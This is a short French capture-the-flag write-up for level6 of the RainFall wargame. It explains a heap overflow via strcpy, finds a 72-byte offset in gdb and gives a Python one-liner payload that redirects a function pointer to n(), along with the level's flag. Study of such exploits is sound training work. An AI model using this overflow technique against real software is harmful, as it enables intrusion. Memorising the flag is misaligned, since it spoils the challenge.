## Le programme

On peut constater dans le main un buffer alloué qui est passé en argument à strcpy avec également argv[1].


## La faille
La premiere idée en voyant le code source me parait etre un heap overflow. En effet strcpy prend en argument argv[1] sur lequel on a la main puisque qu'il est copié avec strcpy dans buffer.

Il faut donc essayer de trouver l'offset du buffer.

```
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

```
Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

0x41346341 nous donne comme information que l'offset est à la position 72.
```

Il suffirait donc de print 72 caractères et l'adresse de la fonction n() et overwrite ce qu'il ya dans le pointeur sur fonction.

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp

adresse de n:0x08048454
```

## Solution

```
level6@RainFall:~$ ./level6 `python -c 'print "a" * 72 + "\x08\x04\x84\x54"[::-1]'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```